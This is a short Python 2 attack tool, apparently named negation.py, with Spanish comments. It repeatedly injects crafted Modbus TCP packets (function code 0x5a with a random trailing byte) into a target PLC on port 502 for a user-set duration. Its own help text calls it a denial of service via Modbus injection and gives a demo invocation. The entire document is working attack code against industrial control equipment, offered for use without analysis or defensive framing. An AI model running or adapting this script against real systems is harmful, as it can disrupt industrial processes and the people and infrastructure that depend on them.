# -*- coding: utf-8 -*-
import sys
import time
import socket
import random 
import argparse


parser = argparse.ArgumentParser(prog='negation.py',
								description=' [+] NEGACION al Servicio, via Modbus Injection. (No DOS !!! )', 
								epilog='[+] Demo: negation.py --host <target> --port 502 --min 50  --sec 40',
								version="1.0")

parser.add_argument('--sid',  dest="SlaveID", help='Slave ID (default 00)', default="00")
parser.add_argument('--host', dest="HOST",    help='Host',required=True)
parser.add_argument('--port', dest="PORT",    help='Port (default 502)',type=int,default=502)

parser.add_argument('--hour', dest="HOUR",    help='Hours: 0 to 24 (default 0)', default="0", type=int)
parser.add_argument('--min', dest="MIN",    help='Minutes: 0 to 60 (default 1)', default="1",type=int)
parser.add_argument('--sec', dest="SEC",    help='Seconds: 0 to 60 (default 0)', default="0",type=int)

args       	= 	parser.parse_args()

HST   		= 	args.HOST
SID 		= 	str(args.SlaveID) ### ---> 00 to ff !!!!
portModbus 	= 	args.PORT

stopHour  	= 	str(args.HOUR).zfill(2)
stopMin 	= 	str(args.MIN).zfill(2)
stopSec		= 	str(args.SEC).zfill(2)

if (args.HOUR) >= 0 and (args.HOUR) <= 24:
	pass
else:
	print "\n [!] Error: \t\targument --hour" 
	print " [*] Invalid choice: \t"+stopHour
	print " [>] Choose:\t\tMin 0. max 24 \n"
	sys.exit(0)


if (args.MIN) >= 0 and (args.MIN) <= 60:
	pass
else:
	print "\n [!] Error: \t\targument --min" 
	print " [*] Invalid choice: \t"+stopMin
	print " [>] Choose:\t\tMin 0. max 60 \n"
	sys.exit(0)


if (args.SEC) >= 0 and (args.SEC) <= 60:
	pass
else:
	print "\n [!] Error: \t\targument --sec" 
	print " [*] Invalid choice: \t"+stopSec
	print " [>] Choose:\t\tMin 0. Max 60\n"
	sys.exit(0)

class Colors:
    BLUE 		= '\033[94m'
    GREEN 		= '\033[32m'
    RED 		= '\033[0;31m'
    DEFAULT		= '\033[0m'
    ORANGE 		= '\033[33m'
    WHITE 		= '\033[97m'
    BOLD 		= '\033[1m'
    BR_COLOUR 	= '\033[1;37;40m'

def create_header_modbus(length,unit_id):
    trans_id = "4462"#hex(random.randrange(0000,65535))[2:].zfill(4)  -> dejo transaccion fija
    proto_id = "0000"
    protoLen = length.zfill(4)
    unit_id = unit_id

    return trans_id + proto_id + protoLen + unit_id.zfill(2)

def busyService(pduInjection, tm):
	reqst = {}
	lenPdu = str((len(pduInjection)/2)+1) 
	
	reqst[0] =	create_header_modbus(lenPdu,SID)
	reqst[1] =	pduInjection

	MB_Request = 	reqst[0] # header
	MB_Request +=	reqst[1] # pdu

	try:
		# podremos conectarnos ?
		client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		client.settimeout(95)
		client.connect((HST,portModbus))
	except Exception, e:
		print " [!] No Conecta: "
		print e		

	mb_stopConection = MB_Request.decode('hex')
	print Colors.GREEN+" [+] Send: \t\t"+Colors.BLUE+reqst[0]+Colors.ORANGE+reqst[1]+Colors.DEFAULT
	client.send(mb_stopConection) 
	
	try:
		# tendremos respuesta ?
		modResponse = (client.recv(1024))	
		print " [+] Response: \t\t"+modResponse.encode("hex")
		print " [+] Response(dec): \t"+modResponse+"\n"
	except Exception, e:
	 	print " [!] No Response: \t"+Colors.RED+str(e)+Colors.DEFAULT
	
	client.close()

def runTime(h, m, s):
	stopTime = h +" : "+m+" : "+s

	print " [+] Time stop (aprox):\t[ " + str(stopTime)+" ]\n"
	for h in range(0,25):
		for m in range(0,61):
			for s in range(0,61):

				horX = str(h).zfill(2) 
				minX = str(m).zfill(2)
				segX = str(s).zfill(2)

				actualTime =  horX+" : "+minX+" : "+segX
				time.sleep(1)

				#print fullTime
				if stopTime == actualTime:
					print " [+] STOP:\t[ "+actualTime+" ]"
					sys.exit(0)

				# ------------------------------------------------------- #
				# Durante el tiempo definido ejecutamos funcion: 
				# opt: cada 2 segundos?)
				# ------------------------------------------------------- #

				if s % 4 == 0:
					secuenceRnd = (hex(random.randrange(00,255))[2:]).zfill(2)
					badInjection = "5a01340001"+str(secuenceRnd)+"00"
					busyService(badInjection, actualTime)

runTime(stopHour, stopMin, stopSec) 